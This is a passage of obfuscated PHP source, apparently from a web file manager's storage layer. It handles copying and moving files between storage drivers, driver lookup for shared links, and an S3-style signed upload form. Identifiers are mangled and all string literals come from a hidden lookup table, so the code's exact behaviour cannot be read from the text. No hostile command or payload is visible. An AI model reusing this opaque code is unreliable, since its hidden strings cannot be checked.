$driverListUser = array(); public static function __callStatic($ÚÂñ‘, $•á½’¸¹) { $ñÂÀÍò =& $_SERVER[ë¦»ºéÌ]; $˜½´×¥¬ = $•á½’¸¹; $GLOBALS[$ñÂÀÍò[1126]] = $ñÂÀÍò[1127] . $ÚÂñ‘; Hook::trigger($ñÂÀÍò[1127] . $ÚÂñ‘ . $ñÂÀÍò[1128], $˜½´×¥¬); $¤ù¢ßªä = self::driverMake($•á½’¸¹[0]); if (!$¤ù¢ßªä) { return !1; } if (method_exists($¤ù¢ßªä, $ÚÂñ‘)) { $ó¢·¢ìû = @call_user_func_array(array($¤ù¢ßªä, $ÚÂñ‘), $•á½’¸¹); } else { if (method_exists($¤ù¢ßªä, $ñÂÀÍò[1129])) { $ó¢·¢ìû = @call_user_func_array(array($¤ù¢ßªä, $ÚÂñ‘), $•á½’¸¹); } else { if (method_exists(self, $ÚÂñ‘)) { $ó¢·¢ìû = @call_user_func_array(array(self, $ÚÂñ‘), $•á½’¸¹); } else { $ó¢·¢ìû = call_user_func_array(array(parent, $ÚÂñ‘), $•á½’¸¹); } } } Hook::trigger($ñÂÀÍò[1127] . $ÚÂñ‘ . $ñÂÀÍò[1130], $˜½´×¥¬, $ó¢·¢ìû); return $ó¢·¢ìû; } public static function init($ß¢õàãÏ) { return self::driverMake($ß¢õàãÏ); } public static function copy($“ÉËĞê, $±•Ë×ë¬, $“¡íûÏ = false, $ö¢ıß±ò = false) { return self::copyMoveStart($“ÉËĞê, $±•Ë×ë¬, $“¡íûÏ, $_SERVER[ë¦»ºéÌ][551], $ö¢ıß±ò); } public static function move($‘‘Ó”æ¡, $Ìçİ«í˜, $â€†÷é– = false, $Ê€•©ªğ = false) { return self::copyMoveStart($‘‘Ó”æ¡, $Ìçİ«í˜, $â€†÷é–, $_SERVER[ë¦»ºéÌ][553], $Ê€•©ªğ); } private static function copyMoveStart($ÓöóÌ´”, $øí…†¥, $óûğ”Ãè, $ˆÌ•²˜…, $àÔò¬ğâ) { $ğó§Şß£ =& $_SERVER[ë¦»ºéÌ]; $•ÄĞĞüå = array($ÓöóÌ´”, $øí…†¥, $óûğ”Ãè, $àÔò¬ğâ); Hook::trigger($ğó§Şß£[1127] . $ˆÌ•²˜… . $ğó§Şß£[1128], $•ÄĞĞüå); $™œÚŠº = self::copyMove($ÓöóÌ´”, $øí…†¥, $óûğ”Ãè, $ˆÌ•²˜…, $àÔò¬ğâ); Hook::trigger($ğó§Şß£[1127] . $ˆÌ•²˜… . $ğó§Şß£[1130], $•ÄĞĞüå, $™œÚŠº); return $™œÚŠº; } public static function saveFile($ˆ©ÔÈ±½, $ÛÈĞªî§, $²’ŠÓÜÁ = true) { $ÜîÊÀûì =& $_SERVER[ë¦»ºéÌ]; $Ç”˜¦üé = self::info($ÛÈĞªî§); $¯ÍÕ½·Û = self::driverMake($ˆ©ÔÈ±½); $ÔÉ ä = self::driverMake($ÛÈĞªî§); $¿äµ½ö˜ = !1; if ($ÔÉ ä->pathParse[$ÜîÊÀûì[1131]]) { $¿äµ½ö˜ = $ÔÉ ä; $ª®æİïÆ = $ÔÉ ä->pathParse[$ÜîÊÀûì[1131]]; $ÔÉ ä = self::driverMake($ª®æİïÆ); } if ($¯ÍÕ½·Û->pathParse[$ÜîÊÀûì[1131]]) { $šÂ‰Ñü = $¯ÍÕ½·Û->pathParse[$ÜîÊÀûì[1131]]; $¯ÍÕ½·Û = self::driverMake($šÂ‰Ñü); } $º‘ÁÍëà = $ÔÉ ä->pathFather($ÛÈĞªî§); $¿µé½û = !0; if (!$²’ŠÓÜÁ && self::driverIsSame($¯ÍÕ½·Û, $ÔÉ ä)) { $¿µé½û = !1; } $ÌÁ’‘ = self::copyFile($¯ÍÕ½·Û, $ˆ©ÔÈ±½, $ÔÉ ä, $º‘ÁÍëà, $Ç”˜¦üé[$ÜîÊÀûì[42]], $¿µé½û); if ($¿äµ½ö˜) { $ÌÁ’‘ = $¿äµ½ö˜->getPathOuter($ÌÁ’‘); } return $ÌÁ’‘; } private static function copyMove($ášîõƒ§, $ñŒù”©, $‘‰®—Íµ, $§ç¨š©, $Ë¼é³ª† = false) { $áŒ‡Î½ñ =& $_SERVER[ë¦»ºéÌ]; if (!$ášîõƒ§ || $ášîõƒ§ == $áŒ‡Î½ñ[8] || !$ñŒù”©) { return !1; } ignore_timeout(); $ìŒĞ±æó = self::driverMake($ášîõƒ§); $½ÆÌå´ = self::driverMake($ñŒù”©); $Ä¾º¸ ‰ = $§ç¨š© == $áŒ‡Î½ñ[553]; $ Æ¿›¡… = !1; if ($½ÆÌå´->pathParse[$áŒ‡Î½ñ[1131]]) { $ Æ¿›¡… = $½ÆÌå´; $ñŒù”© = $½ÆÌå´->pathParse[$áŒ‡Î½ñ[1131]]; $½ÆÌå´ = self::driverMake($ñŒù”©); } if ($ìŒĞ±æó->pathParse[$áŒ‡Î½ñ[1131]]) { $ášîõƒ§ = $ìŒĞ±æó->pathParse[$áŒ‡Î½ñ[1131]]; $ìŒĞ±æó = self::driverMake($ášîõƒ§); } self::check($ìŒĞ±æó, $ášîõƒ§, $½ÆÌå´, $ñŒù”©); Hook::trigger($áŒ‡Î½ñ[85], $ìŒĞ±æó, $ášîõƒ§, $½ÆÌå´, $ñŒù”©); $ÃÖıõŒ´ = self::driverIsSame($ìŒĞ±æó, $½ÆÌå´); if ($ÃÖıõŒ´) { if ($§ç¨š© == $áŒ‡Î½ñ[553] && !method_exists($½ÆÌå´, $áŒ‡Î½ñ[1132]) && trim($ñŒù”©, $áŒ‡Î½ñ[8]) == trim($½ÆÌå´->pathFather($ášîõƒ§), $áŒ‡Î½ñ[8])) { if ($ìŒĞ±æó->pathThis($ášîõƒ§) != $Ë¼é³ª† && !$ìŒĞ±æó->isTypeObject()) { return $ìŒĞ±æó->rename($ášîõƒ§, $Ë¼é³ª†); } return $½ÆÌå´->getPathOuter($ášîõƒ§); } if (method_exists($½ÆÌå´, $§ç¨š©)) { return $½ÆÌå´->{$§ç¨š©}($ášîõƒ§, $ñŒù”©, $‘‰®—Íµ, $Ë¼é³ª†); } } if ($ÃÖıõŒ´ && $§ç¨š© == $áŒ‡Î½ñ[553] && $½ÆÌå´->getType() == $áŒ‡Î½ñ[117]) { $ŠßÆ•­ş = $½ÆÌå´->movePath($ášîõƒ§, $ñŒù”©, $Ë¼é³ª†); if ($ŠßÆ•­ş) { return $ŠßÆ•­ş; } } $¯Îâ›â¬ = $ìŒĞ±æó->isFile($ášîõƒ§); if (!$¯Îâ›â¬ && $½ÆÌå´->getType() == $áŒ‡Î½ñ[742] && $ìŒĞ±æó->getType() == $áŒ‡Î½ñ[117]) { $ŠßÆ•­ş = $½ÆÌå´->copyFolderFromIO($ìŒĞ±æó, $ášîõƒ§, $ñŒù”©, $‘‰®—Íµ, $Ä¾º¸ ‰, $Ë¼é³ª†); } else { $ŠßÆ•­ş = self::copyPath($ìŒĞ±æó, $ášîõƒ§, $½ÆÌå´, $ñŒù”©, $‘‰®—Íµ, $Ä¾º¸ ‰, $¯Îâ›â¬, $Ë¼é³ª†); } if ($ŠßÆ•­ş && $Ä¾º¸ ‰) { $ìŒĞ±æó->remove($ášîõƒ§); } if ($ Æ¿›¡…) { $ŠßÆ•­ş = $ Æ¿›¡…->getPathOuter($ŠßÆ•­ş); } return $ŠßÆ•­ş; } private static function check($î¿·’, $°“Ü—Ïç, $±±ëòô, &$ÆûÏÈ›í) { $—‡‡–ï´ =& $_SERVER[ë¦»ºéÌ]; if (self::driverIsSame($î¿·’, $±±ëòô) && $î¿·’->isFolder($°“Ü—Ïç) && $î¿·’->isParentOf($°“Ü—Ïç, $ÆûÏÈ›í)) { show_json(LNG($—‡‡–ï´[1133]), !1); } if (!$î¿·’->exist($°“Ü—Ïç)) { show_json(LNG($—‡‡–ï´[116]), !1); } } private static function copyPath($â×£ëÁ, $½Ó½àÊŞ, $˜õåàà‚, $ñ¼æÏ…, $Ê€´äö , $ÙÖÊÔ¶³, $â†İÈÖÈ, $ÒõˆÄå = false) { $’ÙûÎ… =& $_SERVER[ë¦»ºéÌ]; $É‡Ÿƒ×Ê = empty($ÒõˆÄå) && $ÒõˆÄå !== $’ÙûÎ…[202] ? $â×£ëÁ->pathThis($½Ó½àÊŞ) : $ÒõˆÄå; if ($Ê€´äö ) { $ß‚øœïÒ = $˜õåàà‚->fileNameExist($ñ¼æÏ…, $É‡Ÿƒ×Ê); $É‡Ÿƒ×Ê = $˜õåàà‚->fileNameAuto($ñ¼æÏ…, $É‡Ÿƒ×Ê, $Ê€´äö , !$â†İÈÖÈ); $Ê€´äö  = $ß‚øœïÒ ? $Ê€´äö  : !1; } if ($â†İÈÖÈ) { return self::copyFile($â×£ëÁ, $½Ó½àÊŞ, $˜õåàà‚, $ñ¼æÏ…, $É‡Ÿƒ×Ê, $ÙÖÊÔ¶³); } if ($Ê€´äö  == REPEAT_RENAME_FOLDER) { $Ê€´äö  = !1; } $Øñ•’ê± = rtrim($ñ¼æÏ…, $’ÙûÎ…[8]) . $’ÙûÎ…[8] . $É‡Ÿƒ×Ê; $á™¼–¸µ = $˜õåàà‚->mkdir($˜õåàà‚->getPath($Øñ•’ê±)); $ñ¼æÏ… = $˜õåàà‚->getPathInner($á™¼–¸µ); $ÇšÛ„İ± = $â×£ëÁ->listPath($½Ó½àÊŞ, !0); $ÇšÛ„İ± = is_array($ÇšÛ„İ±) ? $ÇšÛ„İ± : array($’ÙûÎ…[86] => array(), $’ÙûÎ…[87] => array()); $—†“¤îô = array_merge($ÇšÛ„İ±[$’ÙûÎ…[86]], $ÇšÛ„İ±[$’ÙûÎ…[87]]); foreach ($—†“¤îô as $ü½³Û¨Ñ) { $¤Ïßóù = $ü½³Û¨Ñ[$’ÙûÎ…[43]] == $’ÙûÎ…[204]; $½Ó½àÊŞ = $â×£ëÁ->getPathInner($ü½³Û¨Ñ[$’ÙûÎ…[88]]); $–üÏÄÍÖ = self::copyPath($â×£ëÁ, $½Ó½àÊŞ, $˜õåàà‚, $ñ¼æÏ…, $Ê€´äö , $ÙÖÊÔ¶³, $¤Ïßóù); if (!$–üÏÄÍÖ) { IO::errorTips($’ÙûÎ…[1134] . $½Ó½àÊŞ . $’ÙûÎ…[80] . $ñ¼æÏ…); } } self::copyMoveKeepInfo($â×£ëÁ, $½Ó½àÊŞ, $á™¼–¸µ); return $á™¼–¸µ; } private static function copyFile($¶äïó¸•, $¬ß‘ãÚ, $¹…ÈË š, $à‰ÍşÃ, $êäò’¬», $ğ¾ú’îË) { $°Ÿš€èó =& $_SERVER[ë¦»ºéÌ]; $à‰ÍşÃ = $¹…ÈË š->getPath(rtrim($à‰ÍşÃ, $°Ÿš€èó[8]) . $°Ÿš€èó[8] . $êäò’¬»); $‘•äê˜à = $°Ÿš€èó[1135] . time() . rand_string(5); Hook::trigger($°Ÿš€èó[1136], $¶äïó¸•, $¬ß‘ãÚ, $¹…ÈË š, $à‰ÍşÃ, $êäò’¬», $‘•äê˜à); if (self::driverIsSame($¶äïó¸•, $¹…ÈË š)) { if ($ğ¾ú’îË) { $òçˆ—™ = $¹…ÈË š->moveFile($¬ß‘ãÚ, $à‰ÍşÃ); } else { $òçˆ—™ = $¹…ÈË š->copyFile($¬ß‘ãÚ, $à‰ÍşÃ); } Hook::trigger($°Ÿš€èó[1137], $¶äïó¸•, $¬ß‘ãÚ, $¹…ÈË š, $à‰ÍşÃ, $êäò’¬», $òçˆ—™); self::copyMoveKeepInfo($¶äïó¸•, $¬ß‘ãÚ, $òçˆ—™); return $òçˆ—™; } $ÁŞ³¼ = TEMP_FILES; if ($GLOBALS[$°Ÿš€èó[6]][$°Ÿš€èó[100]][$°Ÿš€èó[780]]) { $ÁŞ³¼ = $GLOBALS[$°Ÿš€èó[6]][$°Ÿš€èó[100]][$°Ÿš€èó[780]]; } $Á•÷˜»ú = $ÁŞ³¼; mk_dir($Á•÷˜»ú); $øà€º’‡ = $Á•÷˜»ú . $‘•äê˜à; $ôŞ½Ü¹ = $øà€º’‡; $øà€º’‡ = $¶äïó¸•->download($¬ß‘ãÚ, $øà€º’‡); $øà€º’‡ = $¶äïó¸•->iconvApp($øà€º’‡); if (substr($øà€º’‡, strlen($ÁŞ³¼)) == $ÁŞ³¼) { $ğ¾ú’îË = !0; } $òçˆ—™ = $¹…ÈË š->upload($à‰ÍşÃ, $øà€º’‡, $ğ¾ú’îË); self::remove($ôŞ½Ü¹); Hook::trigger($°Ÿš€èó[1137], $¶äïó¸•, $¬ß‘ãÚ, $¹…ÈË š, $à‰ÍşÃ, $êäò’¬», $òçˆ—™); self::copyMoveKeepInfo($¶äïó¸•, $¬ß‘ãÚ, $òçˆ—™); return $òçˆ—™; } private static function copyMoveKeepInfo($ÕÕ•ƒÁ, $ÕÑ„Ûé, $„ÈöÂõÛ) { if (!$„ÈöÂõÛ) { return; } $‰º¡‰ = $ÕÕ•ƒÁ->info($ÕÑ„Ûé); if (!is_array($‰º¡‰)) { return; } IO::setModifyTime($„ÈöÂõÛ, $‰º¡‰[$_SERVER[ë¦»ºéÌ][96]]); } public static function pathFather($åşıïşö) { $øÏª‘µå = IO::init($åşıïşö); $‘«§°¨ğ = $øÏª‘µå->pathFather($øÏª‘µå->path); return $øÏª‘µå->getPathOuter($‘«§°¨ğ); } public static function fileOut($¨ñÌ«†è, $¡¼©¼°— = false, $ÕëĞ·ø = false, $İ÷÷Ø¿® = '') { $£ãª‡ºÅ = self::driverMake($¨ñÌ«†è); if ($£ãª‡ºÅ->isFileOutServer()) { return $£ãª‡ºÅ->fileOutServer($¨ñÌ«†è, $¡¼©¼°—, $ÕëĞ·ø, $İ÷÷Ø¿®); } return $£ãª‡ºÅ->fileOut($¨ñÌ«†è, $¡¼©¼°—, $ÕëĞ·ø, $İ÷÷Ø¿®); } public static function fileOutImage($˜š±¶íƒ, $”Ê‡À = 250) { $˜ØíÜà = array(250, 600, 1200, 2000, 3000, 5000); for ($Çû÷ò¨ = 0; $Çû÷ò¨ < count($˜ØíÜà); $Çû÷ò¨++) { if ($Çû÷ò¨ == 0 && $”Ê‡À <= $˜ØíÜà[$Çû÷ò¨]) { $”Ê‡À = $˜ØíÜà[$Çû÷ò¨]; break; } else { if ($”Ê‡À > $˜ØíÜà[$Çû÷ò¨ - 1] && $”Ê‡À <= $˜ØíÜà[$Çû÷ò¨]) { $”Ê‡À = $˜ØíÜà[$Çû÷ò¨]; break; } else { if ($Çû÷ò¨ == count($˜ØíÜà) - 1 && $”Ê‡À > $˜ØíÜà[$Çû÷ò¨]) { $”Ê‡À = $˜ØíÜà[$Çû÷ò¨]; break; } } } } $¤¤¯³‹ = self::driverMake($˜š±¶íƒ); if ($¤¤¯³‹->isFileOutServer()) { return $¤¤¯³‹->fileOutImageServer($˜š±¶íƒ, $”Ê‡À); } return $¤¤¯³‹->fileOutImage($˜š±¶íƒ, $”Ê‡À); } private static function driverIsSame($áÒ¨ß÷, $­õ¡ ) { $ØŸ¯æ«‹ =& $_SERVER[ë¦»ºéÌ]; $òï†–¶ = $áÒ¨ß÷->getType(); $ş‚‚¿×É = $­õ¡ ->getType(); if ($òï†–¶ != $ş‚‚¿×É) { return !1; } if ($òï†–¶ == $ØŸ¯æ«‹[742]) { return !0; } if ($òï†–¶ == $ØŸ¯æ«‹[117]) { return !0; } if ($áÒ¨ß÷->pathDriver == $­õ¡ ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Äµ¹‹‡¼, $ÔÏ¿æ‡â) { $ö¿ˆ÷¹ =& $_SERVER[ë¦»ºéÌ]; if (!IO::exist($Äµ¹‹‡¼)) { return !1; } if (!IO::exist($ÔÏ¿æ‡â)) { IO::mkdir($ÔÏ¿æ‡â); } $Ëõå‹Ïê = self::_listAll($Äµ¹‹‡¼); $àñĞ—œƒ = self::_listAll($ÔÏ¿æ‡â); $µµ™“¨Ã = array(); $ÎóÏ¢œÕ = array(); foreach ($Ëõå‹Ïê as $½™ıÄ”¥ => $É«ÈÖ­) { if (isset($àñĞ—œƒ[$½™ıÄ”¥])) { if ($É«ÈÖ­[$ö¿ˆ÷¹[89]] == 1) { continue; } if ($àñĞ—œƒ[$½™ıÄ”¥][$ö¿ˆ÷¹[90]] == $É«ÈÖ­[$ö¿ˆ÷¹[90]]) { continue; } } if ($É«ÈÖ­[$ö¿ˆ÷¹[89]] == 1) { $ÎóÏ¢œÕ[] = $ÔÏ¿æ‡â . $ö¿ˆ÷¹[8] . $½™ıÄ”¥; continue; } $üíÊäŠ¾ = strstr(trim($½™ıÄ”¥, $ö¿ˆ÷¹[8]), $ö¿ˆ÷¹[8]) ? get_path_father($½™ıÄ”¥) : $ö¿ˆ÷¹[12]; $µµ™“¨Ã[] = array($ö¿ˆ÷¹[1138] => $É«ÈÖ­[$ö¿ˆ÷¹[88]], $ö¿ˆ÷¹[1139] => rtrim($ÔÏ¿æ‡â, $ö¿ˆ÷¹[8]) . $ö¿ˆ÷¹[8] . $üíÊäŠ¾, $ö¿ˆ÷¹[1140] => $É«ÈÖ­); } $‰ó¡…äÚ = array($ö¿ˆ÷¹[204] => $µµ™“¨Ã, $ö¿ˆ÷¹[89] => $ÎóÏ¢œÕ); Hook::trigger($ö¿ˆ÷¹[1141], $Äµ¹‹‡¼, $ÔÏ¿æ‡â, $‰ó¡…äÚ); foreach ($ÎóÏ¢œÕ as $É«ÈÖ­) { IO::mkdir($É«ÈÖ­); } foreach ($µµ™“¨Ã as $É«ÈÖ­) { IO::copy($É«ÈÖ­[$ö¿ˆ÷¹[1138]], $É«ÈÖ­[$ö¿ˆ÷¹[1139]], REPEAT_REPLACE); } } private static function _listAll($£òü) { $óüÚÇ¦Ñ =& $_SERVER[ë¦»ºéÌ]; $£òü = KodIO::clear($£òü); $ùš×Õş’ = IO::listAll($£òü); foreach ($ùš×Õş’ as &$¹äŞçâ¾) { $ÓÕé•ıò = substr($¹äŞçâ¾[$óüÚÇ¦Ñ[88]], strlen($£òü)); $¹äŞçâ¾[$óüÚÇ¦Ñ[1142]] = trim($ÓÕé•ıò, $óüÚÇ¦Ñ[8]); } unset($¹äŞçâ¾); return array_to_keyvalue($ùš×Õş’, $óüÚÇ¦Ñ[1142]); } public static function fileSubstr($™¶ÉÍÍÃ, $í­İ, $è”™¸Ä¼ = false) { $¦Ó¶ø =& $_SERVER[ë¦»ºéÌ]; $‘ÖïÍø‰ = self::driverMake($™¶ÉÍÍÃ); $‰ÇãÔà¸ = $‘ÖïÍø‰->size($™¶ÉÍÍÃ); $·Î‹¥§ = $í­İ; $úœ—şì¨ = $è”™¸Ä¼; if ($í­İ < 0) { $í­İ = $‰ÇãÔà¸ + $í­İ; } if ($è”™¸Ä¼ === !1) { $è”™¸Ä¼ = $‰ÇãÔà¸ - $í­İ; } if ($í­İ + $è”™¸Ä¼ > $‰ÇãÔà¸) { $è”™¸Ä¼ = $‰ÇãÔà¸ - $í­İ; } if (!$‰ÇãÔà¸ && $‘ÖïÍø‰->getType() == $¦Ó¶ø[117] && !$‘ÖïÍø‰->exist($™¶ÉÍÍÃ)) { throw new Exception($¦Ó¶ø[1143] . LNG($¦Ó¶ø[1144]) . $¦Ó¶ø[946] . get_path_this($™¶ÉÍÍÃ) . $¦Ó¶ø[12]); } if ($è”™¸Ä¼ <= 0) { return $¦Ó¶ø[12]; } if ($í­İ < 0 || $í­İ >= $‰ÇãÔà¸ || $è”™¸Ä¼ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\145\141\144\x20\145\x72\x72\x6f\x72\x21\40\x73\x74\141\x72\164\x3d{$í­İ}\73\x6c\x65\156\147\x74\x68\75{$è”™¸Ä¼}\x3b\40\163\x69\x7a\145\x3d{$‰ÇãÔà¸}\73"); } $»³şíŸç = $‘ÖïÍø‰->fileSubstr($™¶ÉÍÍÃ, $í­İ, $è”™¸Ä¼); if (!$»³şíŸç && $è”™¸Ä¼ && isset($GLOBALS[$¦Ó¶ø[1145]])) { throw new Exception($GLOBALS[$¦Ó¶ø[1145]][$¦Ó¶ø[1146]]); } return $»³şíŸç; } private static function driverMake(&$»©ÎŒöÛ) { $ªáÖ¢àò =& $_SERVER[ë¦»ºéÌ]; $ˆÔ¡ˆŠ = KodIO::parse($»©ÎŒöÛ); if (!self::$driverListSystem) { $¸ÅÊá¼Ú = Model($ªáÖ¢àò[751])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¸ÅÊá¼Ú, $ªáÖ¢àò[403]); } if ($ˆÔ¡ˆŠ[$ªáÖ¢àò[43]] == KodIO::KOD_IO && !self::$driverListSystem[$ˆÔ¡ˆŠ[$ªáÖ¢àò[403]]]) { return !1; } $»©ÎŒöÛ = $ˆÔ¡ˆŠ[$ªáÖ¢àò[1147]]; $…äË÷îÕ = self::driverGet($ˆÔ¡ˆŠ, $»©ÎŒöÛ); return $…äË÷îÕ; } private static function driverGet($º±äüûä, &$ Õ¶’Õñ) { $Ã¹õˆ¤ =& $_SERVER[ë¦»ºéÌ]; $äØıÜ³Æ = $º±äüûä[$Ã¹õˆ¤[1148]]; $õıÙùßŠ = $º±äüûä[$Ã¹õˆ¤[403]]; switch ($º±äüûä[$Ã¹õˆ¤[43]]) { case KodIO::KOD_IO: $ğëšç»Í = self::$driverListSystem[$õıÙùßŠ]; break; case KodIO::KOD_SOURCE: $ Õ¶’Õñ = $õıÙùßŠ . $ Õ¶’Õñ; $ğëšç»Í = array($Ã¹õˆ¤[1149] => $Ã¹õˆ¤[1150], $Ã¹õˆ¤[6] => $º±äüûä); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $×«°ëœ” = $GLOBALS[$Ã¹õˆ¤[1151]]; self::$driverListUser = array_to_keyvalue($×«°ëœ”, $Ã¹õˆ¤[403]); } $ğëšç»Í = self::$driverListUser[$õıÙùßŠ]; break; case KodIO::KOD_SHARE_LINK: $ğëšç»Í = array($Ã¹õˆ¤[1149] => $Ã¹õˆ¤[1152], $Ã¹õˆ¤[6] => $º±äüûä); $º˜Ÿï¬ = Action($Ã¹õˆ¤[1153])->sharePathInfo($º±äüûä[$Ã¹õˆ¤[88]]); $ Õ¶’Õñ = $º˜Ÿï¬[$Ã¹õˆ¤[405]]; if (!$º˜Ÿï¬[$Ã¹õˆ¤[405]]) { $ãËìÀ›Ú = Model($Ã¹õˆ¤[597])->getInfo($º˜Ÿï¬[$Ã¹õˆ¤[490]]); $ Õ¶’Õñ = KodIO::clear($ãËìÀ›Ú[$Ã¹õˆ¤[1154]] . $º±äüûä[$Ã¹õˆ¤[1147]]); $º±äüûä[$Ã¹õˆ¤[488]] = $ãËìÀ›Ú; $º±äüûä[$Ã¹õˆ¤[1131]] = $ Õ¶’Õñ; $ğëšç»Í = array($Ã¹õˆ¤[1149] => $Ã¹õˆ¤[1155], $Ã¹õˆ¤[6] => $º±äüûä); } break; case KodIO::KOD_SHARE_ITEM: $ğëšç»Í = array($Ã¹õˆ¤[1149] => $Ã¹õˆ¤[1156], $Ã¹õˆ¤[6] => $º±äüûä); $ãËìÀ›Ú = Model($Ã¹õˆ¤[597])->getInfo($º±äüûä[$Ã¹õˆ¤[403]]); if ($ãËìÀ›Ú[$Ã¹õˆ¤[405]] == $Ã¹õˆ¤[202]) { $ Õ¶’Õñ = KodIO::clear($ãËìÀ›Ú[$Ã¹õˆ¤[1154]] . $º±äüûä[$Ã¹õˆ¤[1147]]); $º±äüûä[$Ã¹õˆ¤[488]] = $ãËìÀ›Ú; $º±äüûä[$Ã¹õˆ¤[1131]] = $ Õ¶’Õñ; $ğëšç»Í = array($Ã¹õˆ¤[1149] => $Ã¹õˆ¤[1157], $Ã¹õˆ¤[6] => $º±äüûä); } else { if (!$ Õ¶’Õñ) { $ Õ¶’Õñ = $ãËìÀ›Ú[$Ã¹õˆ¤[405]]; } } break; default: $ Õ¶’Õñ = $º±äüûä[$Ã¹õˆ¤[88]]; $ğëšç»Í = array($Ã¹õˆ¤[1149] => $Ã¹õˆ¤[1158]); break; } $·©´ÕÉ = $º±äüûä[$Ã¹õˆ¤[88]]; if (!isset(self::$driverCache[$·©´ÕÉ])) { $šó°»‰» = strtolower($ğëšç»Í[$Ã¹õˆ¤[106]]); $¦ŞÔôÔÌ = $GLOBALS[$Ã¹õˆ¤[6]][$Ã¹õˆ¤[100]][$Ã¹õˆ¤[810]]; $ŒÑÉÃ   = $Ã¹õˆ¤[84] . (isset($¦ŞÔôÔÌ[$šó°»‰»]) ? $¦ŞÔôÔÌ[$šó°»‰»] : ucfirst($šó°»‰»)); if (!class_exists($ŒÑÉÃ  )) { show_json("{$ŒÑÉÃ  }\40\x6e\x6f\x74\40\145\170\x69\x73\164\x73\x21", !1); } $¯«ÆÙŞá = isset($ğëšç»Í[$Ã¹õˆ¤[6]]) ? $ğëšç»Í[$Ã¹õˆ¤[6]] : !1; self::$driverCache[$·©´ÕÉ] = new $ŒÑÉÃ  ($¯«ÆÙŞá); } $öïòÁ–¥ = self::$driverCache[$·©´ÕÉ]; $öïòÁ–¥->pathDriver = $äØıÜ³Æ; $öïòÁ–¥->pathBase = $Ã¹õˆ¤[12]; if (isset($ğëšç»Í[$Ã¹õˆ¤[6]][$Ã¹õˆ¤[1159]])) { $öïòÁ–¥->pathBase = rtrim($ğëšç»Í[$Ã¹õˆ¤[6]][$Ã¹õˆ¤[1159]], $Ã¹õˆ¤[8]) . $Ã¹õˆ¤[8]; $ Õ¶’Õñ = $öïòÁ–¥->pathBase . ltrim($ Õ¶’Õñ, $Ã¹õˆ¤[8]); } $ Õ¶’Õñ = $öïòÁ–¥->getPath($ Õ¶’Õñ); if (isset($º±äüûä[$Ã¹õˆ¤[1131]])) { $ Õ¶’Õñ = $º±äüûä[$Ã¹õˆ¤[1131]]; } $öïòÁ–¥->path = $ Õ¶’Õñ; return $öïòÁ–¥; } public static function errorTips($áŠãº¿Î = false) { $ìÄÒŸ¢» =& $_SERVER[ë¦»ºéÌ]; static $³ÚÑ  = array(); $–ó†öÌ‡ = 1000; if ($áŠãº¿Î === -1) { return $³ÚÑ  ? $³ÚÑ [count($³ÚÑ ) - 1] : $ìÄÒŸ¢»[12]; } if ($áŠãº¿Î === !1) { return implode($ìÄÒŸ¢»[18], $³ÚÑ ); } if (count($³ÚÑ ) >= $–ó†öÌ‡) { $³ÚÑ  = array_slice($³ÚÑ , $–ó†öÌ‡ * 0.5, $–ó†öÌ‡); } $³ÚÑ [] = $áŠãº¿Î; write_log($ìÄÒŸ¢»[171] . ACTION . $ìÄÒŸ¢»[1160] . $áŠãº¿Î, $ìÄÒŸ¢»[1161]); } public static function getLastError($¡Ë‚Êëè = '') { $¿“ı»Ï = self::errorTips(-1); return $¿“ı»Ï ? $¿“ı»Ï : $¡Ë‚Êëè; } } goto eÍçÃÍ‹ë»; BÙË›òÅã: class PathDriverEDS extends PathDriverMinIO { public function __construct($•‡Ê’ûê) { parent::__construct($•‡Ê’ûê); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ë¹ŞœÁº) { parent::__construct($ë¹ŞœÁº); $this->signatureVersion($_SERVER[ë¦»ºéÌ][223]); } public function uploadFormData($¶™°§„Ì, $«ÈŒ‰ôŠ = 3600) { $‘ ”˜» =& $_SERVER[ë¦»ºéÌ]; $“ßƒ¾ÍÅ = $‘ ”˜»[203]; $âÆÀ¤ª¹ = $‘ ”˜»[1324]; $º–ÜÛë¨ = $‘ ”˜»[72]; $Õ¢·”ù‘ = gmdate($‘ ”˜»[1325]); $ÓÕ¨éäÈ = gmdate($‘ ”˜»[735]); $Ø×¹ó÷¡ = $‘ ”˜»[1326]; $²ºÉ½šÃ = $«ÈŒ‰ôŠ . $‘ ”˜»[12]; $ûõ†İÃ = $‘ ”˜»[1288]; $ó«¦Œª÷ = array($this->accessKey, $ÓÕ¨éäÈ, $this->region, $º–ÜÛë¨, $Ø×¹ó÷¡); $õ¹¡«µ¢ = implode($‘ ”˜»[8], $ó«¦Œª÷); $Û¨€å¿É = array($‘ ”˜»[1290] => gmdate($‘ ”˜»[1289], strtotime($‘ ”˜»[1327])), $‘ ”˜»[1291] => array(array($‘ ”˜»[1293] => $this->bucket), array($‘ ”˜»[1292] => $“ßƒ¾ÍÅ), array($‘ ”˜»[1294], $‘ ”˜»[1295], $‘ ”˜»[12]), array($‘ ”˜»[1294], $‘ ”˜»[1328], $‘ ”˜»[12]), array($‘ ”˜»[1294], $‘ ”˜»[1329], $‘ ”˜»[12]), array($‘ ”˜»[1296] => $ûõ†İÃ), array($‘ ”˜»[1330] => $õ¹¡«µ¢), array($‘ ”˜»[1331] => $âÆÀ¤ª¹), array($‘ ”˜»[1332] => $Õ¢·”ù‘), array($‘ ”˜»[1333] => $²ºÉ½šÃ))); $Åüß¯å† = base64_encode(json_encode($Û¨€å¿É)); $¸¿²üÇ = hash_hmac($‘ ”˜»[1334], $ÓÕ¨éäÈ, $‘ ”˜»[1335] . $this->secret, !0); $ÊİÍ•Ñ  = hash_hmac($‘ ”˜»[1334], $this->region, $¸¿²üÇ, !0); $¯úÒß‹ = hash_hmac($‘ ”˜»[1334], $º–ÜÛë¨, $ÊİÍ•Ñ , !0); $Í„Ù¬½Ñ = hash_hmac($‘ ”˜»[1334], $Ø×¹ó÷¡, $¯úÒß‹, !0); $ŞŸªÆşš = hash_hmac($‘ ”˜»[1334], $Åüß¯å†, $Í„Ù¬½Ñ); $Ğå™¶½ = array($‘ ”˜»[222] => $‘ ”˜»[12], $‘ ”˜»[1336] => $‘ ”˜»[12], $‘ ”˜»[1292] => $“ßƒ¾ÍÅ, $‘ ”˜»[1296] => $ûõ†İÃ, $‘ ”˜»[1300] => $Åüß¯å†, $‘ ”˜»[1337] => $õ¹¡«µ¢, $‘ ”˜»[1338] => $âÆÀ¤ª¹, $‘ 